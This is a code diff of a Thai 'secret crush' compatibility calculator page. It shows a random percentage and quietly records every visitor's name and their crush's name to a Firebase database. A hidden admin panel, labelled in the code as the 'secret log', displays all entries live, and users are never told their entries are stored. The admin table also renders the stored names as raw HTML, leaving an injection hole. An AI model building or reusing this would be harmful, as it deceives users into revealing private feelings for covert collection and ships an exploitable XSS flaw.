@@ -3,293 +3,365 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>คนที่แอบชอบ</title>
-    <!-- Load Tailwind CSS -->
+    <title>คนที่แอบชอบ (Secret Crush)</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Noto+Sans+Thai:wght@400;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
         body {
-            font-family: 'Noto Sans Thai', 'Inter', sans-serif;
-            background-color: #fce7f3; /* Light Pink Background */
+            font-family: 'Inter', sans-serif;
+            background-color: #f7f7f9;
         }
-        .card-shadow {
-            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+        .container-box {
+            background-color: white;
+            padding: 1.5rem;
+            border-radius: 1rem;
+            box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1);
+        }
+        .result-box {
+            min-height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            border-radius: 0.75rem;
+            transition: all 0.3s ease-in-out;
+            font-weight: 700;
+            text-align: center;
+        }
+        .btn-primary {
+            background-color: #f06292; /* Pink */
+            color: white;
+            padding: 0.75rem 1.5rem;
+            border-radius: 0.75rem;
+            font-weight: 600;
+            transition: background-color 0.2s;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(240, 98, 146, 0.4);
+        }
+        .btn-primary:hover {
+            background-color: #d84370;
+        }
+        .loading-spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Mobile-first responsiveness */
+        @media (max-width: 640px) {
+            .container-box {
+                margin: 0.5rem;
+                padding: 1rem;
+            }
         }
     </style>
 </head>
-<body class="min-h-screen flex items-start justify-center p-4 md:p-8">
-    <div id="app-container" class="w-full max-w-xl">
-        
+<body class="p-4 flex flex-col items-center min-h-screen">
+
+    <div id="main-app" class="w-full max-w-md mt-8">
+
         <!-- Header -->
-        <header class="text-center mb-8">
-            <h1 class="text-4xl font-extrabold text-pink-600 mb-2">💘 คนที่แอบชอบ 💘</h1>
-            <p class="text-gray-600">คำนวณเปอร์เซ็นต์ความเข้ากันได้</p>
-        </header>
+        <h1 class="text-3xl font-bold text-center text-pink-500 mb-6">💖 คนที่แอบชอบ</h1>
 
-        <!-- Main Compatibility Card -->
-        <div id="compatibility-card" class="bg-white p-6 md:p-8 rounded-xl card-shadow border-t-4 border-pink-500 mb-8">
-            <div id="auth-status" class="text-xs text-gray-500 mb-4 text-right">กำลังตรวจสอบสิทธิ์...</div>
-            <div id="user-id-display" class="text-xs text-gray-400 mb-4 truncate" style="word-break: break-all;"></div>
+        <!-- User Information Box -->
+        <div id="user-info-box" class="container-box mb-6 text-sm text-center">
+            <p id="auth-status" class="text-gray-600 mb-1">สถานะ: <span class="font-semibold text-red-500">กำลังเริ่มต้นระบบ...</span></p>
+            <p class="text-xs text-gray-500">นี่คือ User ID ชั่วคราวของคุณ:</p>
+            <p id="user-uid" class="font-mono text-xs p-1 bg-gray-100 rounded-lg break-all">กำลังโหลด...</p>
+        </div>
 
-            <form id="compatibility-form" class="space-y-4">
+        <!-- Compatibility Form -->
+        <div id="compatibility-form-container" class="container-box mb-6">
+            <h2 class="text-xl font-semibold mb-4 text-gray-700">วัดระดับความเข้ากัน!</h2>
+            <form id="crush-form" class="space-y-4">
                 <div>
-                    <label for="your-name" class="block text-sm font-medium text-gray-700">ชื่อของคุณ</label>
-                    <input type="text" id="your-name" required placeholder="เช่น แก้ว"
-                           class="mt-1 block w-full px-4 py-2 border border-pink-300 rounded-lg focus:ring-pink-500 focus:border-pink-500">
+                    <label for="userName" class="block text-sm font-medium text-gray-700 mb-1">ชื่อของคุณ:</label>
+                    <input type="text" id="userName" required
+                           class="w-full p-3 border border-gray-300 rounded-lg focus:ring-pink-500 focus:border-pink-500"
+                           placeholder="เช่น: สมชาย">
                 </div>
                 <div>
-                    <label for="crush-name" class="block text-sm font-medium text-gray-700">ชื่อคนที่คุณชอบ</label>
-                    <input type="text" id="crush-name" required placeholder="เช่น พายุ"
-                           class="mt-1 block w-full px-4 py-2 border border-pink-300 rounded-lg focus:ring-pink-500 focus:border-pink-500">
+                    <label for="crushName" class="block text-sm font-medium text-gray-700 mb-1">ชื่อคนที่คุณแอบชอบ:</label>
+                    <input type="text" id="crushName" required
+                           class="w-full p-3 border border-gray-300 rounded-lg focus:ring-pink-500 focus:border-pink-500"
+                           placeholder="เช่น: สมหญิง">
                 </div>
-                <button type="submit" id="calculate-button"
-                        class="w-full py-3 px-4 bg-pink-500 text-white font-bold rounded-xl hover:bg-pink-600 transition duration-150 transform hover:scale-[1.01] focus:outline-none focus:ring-2 focus:ring-pink-500 focus:ring-offset-2 disabled:bg-pink-300">
-                    คำนวณ!
+                <button type="submit" id="submit-btn" class="btn-primary w-full flex items-center justify-center">
+                    <span id="btn-text">คำนวณ!</span>
+                    <div id="btn-loading" class="loading-spinner hidden ml-2"></div>
                 </button>
             </form>
-
-            <!-- Result Display -->
-            <div id="result-container" class="mt-6 hidden text-center p-4 border-2 border-pink-200 rounded-xl bg-pink-50">
-                <h2 class="text-xl font-semibold text-gray-800">ผลลัพธ์:</h2>
-                <div id="compatibility-percent" class="text-6xl font-extrabold text-pink-500 mt-2">--%</div>
-                <p id="compatibility-message" class="text-lg text-gray-700 mt-2"></p>
-                <button onclick="document.getElementById('result-container').classList.add('hidden');"
-                        class="mt-4 text-sm text-pink-500 hover:text-pink-700 transition duration-150">
-                    คำนวณใหม่อีกครั้ง
-                </button>
-            </div>
-
-             <!-- Error/Loading Message Box (Replacing alert()) -->
-            <div id="message-box" class="mt-4 p-3 hidden rounded-lg text-sm" role="alert"></div>
-
         </div>
-        
-        <!-- Admin Data Table (Hidden by default) -->
-        <div id="admin-data-section" class="mt-10 hidden">
-            <h2 class="text-2xl font-bold text-gray-700 mb-4 border-b pb-2 border-pink-300">📊 ข้อมูลลับ (สำหรับผู้ดูแลเท่านั้น)</h2>
-            <div class="overflow-x-auto bg-white p-4 rounded-xl card-shadow">
+
+        <!-- Result Display -->
+        <div class="container-box mb-8">
+            <h2 class="text-xl font-semibold mb-4 text-gray-700">ผลลัพธ์ความเข้ากันได้</h2>
+            <div id="result-display" class="result-box bg-pink-100 border-2 border-pink-300">
+                <p class="text-gray-500">กรุณาใส่ชื่อและกดคำนวณ...</p>
+            </div>
+        </div>
+
+        <!-- Admin Table (Hidden by default) -->
+        <div id="admin-view" class="w-full mt-8 hidden">
+            <h2 class="text-2xl font-bold mb-4 text-center text-red-600">🚨 ข้อมูลลับ (Admin View) 🚨</h2>
+            <p class="text-sm text-center text-gray-600 mb-4">ตารางนี้จะอัปเดตแบบเรียลไทม์เมื่อมีคนคำนวณ</p>
+            <div class="container-box p-0 overflow-x-auto">
                 <table class="min-w-full divide-y divide-gray-200">
-                    <thead class="bg-pink-100">
+                    <thead class="bg-gray-50">
                         <tr>
-                            <th class="px-3 py-3 text-left text-xs font-medium text-gray-600 uppercase tracking-wider">ชื่อผู้ใช้</th>
-                            <th class="px-3 py-3 text-left text-xs font-medium text-gray-600 uppercase tracking-wider">ชื่อคนที่ชอบ</th>
-                            <th class="px-3 py-3 text-left text-xs font-medium text-gray-600 uppercase tracking-wider">เปอร์เซ็นต์</th>
-                            <th class="px-3 py-3 text-left text-xs font-medium text-gray-600 uppercase tracking-wider">เวลา</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">เวลา</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">ชื่อผู้ใช้</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">ชื่อคนที่ชอบ</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">%</th>
                         </tr>
                     </thead>
-                    <tbody id="admin-data-body" class="bg-white divide-y divide-gray-200 text-sm">
-                        <!-- Data will be inserted here by JavaScript -->
-                        <tr><td colspan="4" class="text-center py-4 text-gray-500">กำลังโหลดข้อมูล...</td></tr>
+                    <tbody id="admin-results-tbody" class="bg-white divide-y divide-gray-200">
+                        <!-- Data rows will be inserted here -->
+                        <tr><td colspan="4" class="text-center py-4 text-gray-400">กำลังโหลดข้อมูลลับ...</td></tr>
                     </tbody>
                 </table>
             </div>
         </div>
     </div>
 
-    <!-- Firebase SDK Imports -->
+
     <script type="module">
-        // 1. IMPORT
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-        import { getFirestore, doc, addDoc, onSnapshot, collection, query, serverTimestamp, setLogLevel } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
-        
-        // --- ADMIN CONFIGURATION (CRITICAL) ---
-        // !!! IMPORTANT: REPLACE 'YOUR_ADMIN_UID_HERE' WITH YOUR ACTUAL USER ID !!!
-        const ADMIN_UID_TO_REPLACE = 'YOUR_ADMIN_UID_HERE'; 
-        // -------------------------------------
-
-        // Global Firebase variables
-        let app = null;
-        let db = null;
-        let auth = null;
-        let userId = null;
+        // Global variables for Firebase environment (provided by the platform)
         const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
+        const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : null;
+        const initialAuthToken = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : null;
 
-        const authStatusEl = document.getElementById('auth-status');
-        const userIdDisplayEl = document.getElementById('user-id-display');
-        const messageBox = document.getElementById('message-box');
-        const adminDataSection = document.getElementById('admin-data-section');
-        const adminDataBody = document.getElementById('admin-data-body');
-        const calculateButton = document.getElementById('calculate-button');
+        let app, db, auth;
+        let userId = null;
+        let isAuthReady = false;
 
-        // Helper function for UI messages
-        function showMessage(message, type = 'info') {
-            messageBox.textContent = message;
-            messageBox.classList.remove('hidden', 'bg-red-100', 'text-red-700', 'bg-green-100', 'text-green-700', 'bg-blue-100', 'text-blue-700');
-            
-            if (type === 'error') {
-                messageBox.classList.add('bg-red-100', 'text-red-700');
-            } else if (type === 'success') {
-                messageBox.classList.add('bg-green-100', 'text-green-700');
-            } else {
-                messageBox.classList.add('bg-blue-100', 'text-blue-700');
-            }
-            messageBox.classList.remove('hidden');
-        }
+        // --- CONFIGURATION ---
+        // !!! VERY IMPORTANT: REPLACE THIS STRING with your actual User ID from the UI !!!
+        const ADMIN_UID = 'YOUR_ADMIN_UID_HERE'; 
+        // ---------------------
 
-        // 2. INITIALIZATION AND AUTHENTICATION
+        // Firebase Imports
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged, setPersistence, browserSessionPersistence } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, collection, addDoc, onSnapshot, query, serverTimestamp, setLogLevel } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        // DOM elements
+        const userInfoBox = document.getElementById('user-info-box');
+        const userUidDisplay = document.getElementById('user-uid');
+        const authStatus = document.getElementById('auth-status');
+        const adminView = document.getElementById('admin-view');
+        const adminResultsTbody = document.getElementById('admin-results-tbody');
+        const crushForm = document.getElementById('crush-form');
+        const resultDisplay = document.getElementById('result-display');
+        const submitBtn = document.getElementById('submit-btn');
+        const btnText = document.getElementById('btn-text');
+        const btnLoading = document.getElementById('btn-loading');
+
+        // 1. Initialise Firebase and Authentication
         async function initializeAppAndAuth() {
-            authStatusEl.textContent = 'กำลังโหลดการตั้งค่า Firebase...';
-            
+            if (!firebaseConfig) {
+                authStatus.innerHTML = '<span class="font-semibold text-red-500">ข้อผิดพลาดในการเริ่มต้นระบบ: "firebaseConfig" หายไป</span>';
+                return;
+            }
+
             try {
-                setLogLevel('error');
+                // setLogLevel('debug'); // Uncomment for debugging
                 
-                const firebaseConfigString = typeof __firebase_config !== 'undefined' ? __firebase_config : '{}';
-                const firebaseConfig = JSON.parse(firebaseConfigString);
-
-                if (!firebaseConfig || !firebaseConfig.projectId) {
-                    // This is the common environment loading error.
-                    console.error("FIREBASE_CONFIG_ERROR: Project ID missing or config is invalid.");
-                    authStatusEl.textContent = 'ข้อผิดพลาด: ไม่พบการตั้งค่า Firebase (ลองบันทึก/รีโหลดอีกครั้ง)';
-                    showMessage('ระบบไม่สามารถเริ่มต้น Firebase ได้ กรุณาบันทึกโค้ด (Save) และ Preview ใหม่อีกครั้ง', 'error');
-                    return;
-                }
-
-                // Start Firebase App and Firestore
                 app = initializeApp(firebaseConfig);
                 db = getFirestore(app);
                 auth = getAuth(app);
-                
-                authStatusEl.textContent = 'กำลังเข้าสู่ระบบ...';
-                
-                // Sign-in
-                const token = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : null;
-                if (token) {
-                    await signInWithCustomToken(auth, token);
+
+                // Set session persistence (optional, but good practice)
+                await setPersistence(auth, browserSessionPersistence);
+
+                // Sign in with token or anonymously
+                if (initialAuthToken) {
+                    await signInWithCustomToken(auth, initialAuthToken);
                 } else {
                     await signInAnonymously(auth);
                 }
 
-                // Await Auth State Change
+                // Set up Auth State Listener
                 onAuthStateChanged(auth, (user) => {
                     if (user) {
                         userId = user.uid;
-                        authStatusEl.textContent = 'เข้าสู่ระบบสำเร็จ';
-                        userIdDisplayEl.innerHTML = `Your User ID: <span class="font-mono text-gray-500">${userId}</span>`;
-                        
-                        // Check Admin status
-                        if (userId === ADMIN_UID_TO_REPLACE && ADMIN_UID_TO_REPLACE !== 'YOUR_ADMIN_UID_HERE') {
-                            adminDataSection.classList.remove('hidden');
-                            listenForAdminData();
-                            showMessage('✅ โหมดผู้ดูแลเปิดใช้งานแล้ว! คุณเห็นข้อมูลลับทั้งหมด', 'success');
-                        } else if (ADMIN_UID_TO_REPLACE === 'YOUR_ADMIN_UID_HERE') {
-                            showMessage('❗ กรุณาแทนที่ YOUR_ADMIN_UID_HERE ในโค้ดด้วย Your User ID ที่แสดงอยู่ด้านบน เพื่อเปิดใช้งานโหมดผู้ดูแล', 'error');
+                        isAuthReady = true;
+
+                        userUidDisplay.textContent = userId;
+                        authStatus.innerHTML = '<span class="font-semibold text-green-600">เชื่อมต่อแล้ว</span>';
+
+                        // Show admin view if current user is the admin
+                        if (userId === ADMIN_UID && ADMIN_UID !== 'YOUR_ADMIN_UID_HERE') {
+                            adminView.classList.remove('hidden');
+                            listenForAdminData(); // Start listening for data
+                        } else if (userId === ADMIN_UID && ADMIN_UID === 'YOUR_ADMIN_UID_HERE') {
+                             authStatus.innerHTML = '<span class="font-semibold text-yellow-500">กรุณาตั้งค่า ADMIN_UID ในโค้ด</span>';
                         }
+
+
                     } else {
-                        authStatusEl.textContent = 'เข้าสู่ระบบล้มเหลว (User ID ไม่พร้อม)';
-                        userId = null;
+                        isAuthReady = true;
+                        // Fallback if sign-in failed
+                        userUidDisplay.textContent = 'ไม่สามารถยืนยันตัวตนได้';
+                        authStatus.innerHTML = '<span class="font-semibold text-red-500">เกิดข้อผิดพลาดในการยืนยันตัวตน</span>';
                     }
                 });
 
             } catch (error) {
                 console.error("Firebase Initialization Error:", error);
-                // Catch any other deep initialization errors
-                showMessage(`ข้อผิดพลาดในการเริ่มต้นระบบ: ${error.message}. กรุณาลองใหม่`, 'error');
-                authStatusEl.textContent = 'ข้อผิดพลาดในการตั้งค่า';
+                authStatus.innerHTML = `<span class="font-semibold text-red-500">ข้อผิดพลาด: ${error.message.substring(0, 50)}...</span>`;
             }
         }
-
-        // 3. ADMIN DATA LISTENER (READ OPERATION)
-        function listenForAdminData() {
-            if (!db) return;
-
-            const resultsCollectionRef = collection(db, `artifacts/${appId}/public/data/compatibility_results`);
-            const q = query(resultsCollectionRef);
-
-            onSnapshot(q, (snapshot) => {
-                let html = '';
-                if (snapshot.empty) {
-                    html = '<tr><td colspan="4" class="text-center py-4 text-gray-500">ยังไม่มีข้อมูลการคำนวณ</td></tr>';
-                } else {
-                    const results = [];
-                    snapshot.forEach(doc => {
-                        results.push({ id: doc.id, ...doc.data() });
-                    });
-
-                    // Sort data by timestamp (latest first)
-                    results.sort((a, b) => {
-                        const timeA = a.timestamp?.toDate()?.getTime() || 0;
-                        const timeB = b.timestamp?.toDate()?.getTime() || 0;
-                        return timeB - timeA;
-                    });
-
-                    results.forEach(data => {
-                        const date = data.timestamp ? data.timestamp.toDate().toLocaleString('th-TH', { 
-                            hour: '2-digit', minute: '2-digit', second: '2-digit', 
-                            day: '2-digit', month: 'short', year: 'numeric' 
-                        }) : 'N/A';
-                        
-                        html += `
-                            <tr class="hover:bg-pink-50 transition duration-100">
-                                <td class="px-3 py-3 whitespace-nowrap">${data.userName || '-'}</td>
-                                <td class="px-3 py-3 whitespace-nowrap">${data.crushName || '-'}</td>
-                                <td class="px-3 py-3 whitespace-nowrap font-bold text-pink-600">${data.percentage}%</td>
-                                <td class="px-3 py-3 whitespace-nowrap text-xs text-gray-500">${date}</td>
-                            </tr>
-                        `;
-                    });
-                }
-                adminDataBody.innerHTML = html;
-            }, (error) => {
-                console.error("Error listening to data: ", error);
-                showMessage("เกิดข้อผิดพลาดในการโหลดข้อมูลผู้ดูแล", 'error');
-                adminDataBody.innerHTML = '<tr><td colspan="4" class="text-center py-4 text-red-500">ข้อผิดพลาดในการโหลดข้อมูล</td></tr>';
-            });
-        }
-
-        // 4. DATA SUBMISSION (WRITE OPERATION)
-        const form = document.getElementById('compatibility-form');
-
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            if (!db || !userId) {
-                showMessage('ระบบยังไม่พร้อม กรุณารอสักครู่ (กำลังรอการเชื่อมต่อ Firebase)...', 'error');
+        
+        // 2. Data Submission Function (Write to Firestore)
+        async function submitCrushData(userName, crushName, percentage) {
+            if (!isAuthReady || !db || !userId) {
+                console.error("Firestore not ready or user not authenticated.");
                 return;
             }
 
-            const userName = document.getElementById('your-name').value.trim();
-            const crushName = document.getElementById('crush-name').value.trim();
-            const percentage = Math.floor(Math.random() * 101); // Random result
+            // Path: /artifacts/{appId}/public/data/compatibility_results
+            const resultsCollectionRef = collection(db, `artifacts/${appId}/public/data/compatibility_results`);
 
-            calculateButton.disabled = true;
-            calculateButton.textContent = 'กำลังคำนวณ...';
-
-            // Save Data to Firestore
             try {
-                const resultsCollectionRef = collection(db, `artifacts/${appId}/public/data/compatibility_results`);
-
                 await addDoc(resultsCollectionRef, {
-                    userName: userName,
-                    crushName: crushName,
+                    userName: userName, // <--- ข้อมูลลับ
+                    crushName: crushName, // <--- ข้อมูลลับ
                     percentage: percentage,
                     timestamp: serverTimestamp(),
                     submitterId: userId
                 });
-                
-                // Display result
-                document.getElementById('compatibility-percent').textContent = `${percentage}%`;
-                let message = '';
-                if (percentage >= 80) {
-                    message = 'ว้าว! เข้ากันได้ดีสุดๆ ดวงสมพงษ์กันมากค่ะ! 💖';
-                } else if (percentage >= 50) {
-                    message = 'พอไปได้นะ! มีโอกาสพัฒนาความสัมพันธ์แน่นอนค่ะ ✨';
-                } else {
-                    message = 'ต้องใช้ความพยายามอีกหน่อย แต่ความรักไม่มีอะไรแน่นอน! 💪';
-                }
-                document.getElementById('compatibility-message').textContent = message;
-                document.getElementById('result-container').classList.remove('hidden');
-                
             } catch (error) {
-                console.error("Error saving document: ", error);
-                showMessage(`ข้อผิดพลาดในการบันทึกข้อมูล: ${error.message}`, 'error');
-            } finally {
-                calculateButton.disabled = false;
-                calculateButton.textContent = 'คำนวณ!';
+                console.error("Error saving data to Firestore:", error);
+                displayMessage('error', '❌ เกิดข้อผิดพลาดในการบันทึกข้อมูล');
             }
+        }
+
+        // 3. Admin Data Listener (Read from Firestore)
+        function listenForAdminData() {
+            if (!db) return;
+
+            // Path: /artifacts/{appId}/public/data/compatibility_results
+            const resultsCollectionRef = collection(db, `artifacts/${appId}/public/data/compatibility_results`);
+            const q = query(resultsCollectionRef);
+
+            onSnapshot(q, (snapshot) => {
+                const results = [];
+                snapshot.forEach((doc) => {
+                    results.push(doc.data());
+                });
+
+                // Sort by timestamp in descending order (most recent first)
+                results.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
+
+                renderAdminTable(results);
+            }, (error) => {
+                console.error("Error listening to admin data:", error);
+                adminResultsTbody.innerHTML = `<tr><td colspan="4" class="text-center py-4 text-red-500">ข้อผิดพลาดในการดึงข้อมูล: ${error.message.substring(0, 50)}...</td></tr>`;
+            });
+        }
+
+        // Helper Functions
+        
+        function renderAdminTable(data) {
+            adminResultsTbody.innerHTML = ''; // Clear existing rows
+            if (data.length === 0) {
+                adminResultsTbody.innerHTML = '<tr><td colspan="4" class="text-center py-4 text-gray-400">ยังไม่มีใครส่งข้อมูลเลย</td></tr>';
+                return;
+            }
+
+            data.forEach(item => {
+                const date = item.timestamp?.toDate ? item.timestamp.toDate().toLocaleString('th-TH') : 'N/A';
+                const row = document.createElement('tr');
+                row.className = 'hover:bg-pink-50';
+                row.innerHTML = `
+                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">${date}</td>
+                    <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">${item.userName || 'ไม่ระบุ'}</td>
+                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-700">${item.crushName || 'ไม่ระบุ'}</td>
+                    <td class="px-6 py-4 whitespace-nowrap text-sm font-bold text-red-500">${item.percentage}%</td>
+                `;
+                adminResultsTbody.appendChild(row);
+            });
+        }
+
+        function displayMessage(type, message, percentage = null) {
+            resultDisplay.className = 'result-box'; // Reset classes
+            resultDisplay.innerHTML = '';
+            
+            let colorClass, icon, description = '';
+
+            if (type === 'success') {
+                if (percentage >= 80) {
+                    colorClass = 'bg-red-200 border-red-500 text-red-800';
+                    icon = '🔥';
+                    description = 'เข้ากันสุดๆ! พุ่งชนเลย!';
+                } else if (percentage >= 50) {
+                    colorClass = 'bg-yellow-100 border-yellow-400 text-yellow-800';
+                    icon = '😊';
+                    description = 'พอใช้ได้ ลองคุยกันดูนะ';
+                } else {
+                    colorClass = 'bg-blue-100 border-blue-400 text-blue-800';
+                    icon = '💔';
+                    description = 'ความเข้ากันอาจไม่สูง แต่ความพยายามสำคัญกว่านะ!';
+                }
+
+                resultDisplay.classList.add(colorClass);
+                resultDisplay.innerHTML = `
+                    <p class="text-4xl mb-2">${icon}</p>
+                    <p class="text-2xl font-extrabold">${percentage}%</p>
+                    <p class="text-md">${description}</p>
+                `;
+
+            } else if (type === 'error') {
+                resultDisplay.classList.add('bg-red-100 border-red-400 text-red-600');
+                resultDisplay.innerHTML = `<p>${message}</p>`;
+            }
+        }
+        
+        // 4. Form Submission Handler
+        crushForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            if (!isAuthReady) {
+                displayMessage('error', 'ระบบกำลังโหลด กรุณาลองอีกครั้ง');
+                return;
+            }
+
+            const userName = document.getElementById('userName').value.trim();
+            const crushName = document.getElementById('crushName').value.trim();
+
+            if (!userName || !crushName) {
+                displayMessage('error', 'กรุณากรอกชื่อทั้งสองช่อง');
+                return;
+            }
+
+            // Show loading state
+            submitBtn.disabled = true;
+            btnText.classList.add('hidden');
+            btnLoading.classList.remove('hidden');
+
+            // 1. Calculate Random Percentage (This is the visible result)
+            const percentage = Math.floor(Math.random() * 100) + 1;
+
+            // 2. Display the result
+            displayMessage('success', 'ผลลัพธ์การคำนวณ', percentage);
+
+            // 3. Save data to Firestore (This is the secret log)
+            await submitCrushData(userName, crushName, percentage);
+            
+            // Restore button state
+            submitBtn.disabled = false;
+            btnText.classList.remove('hidden');
+            btnLoading.classList.add('hidden');
         });
 
-        // Initialize on load
+        // Initialize the app when the window loads
         window.onload = initializeAppAndAuth;
 
     </script>
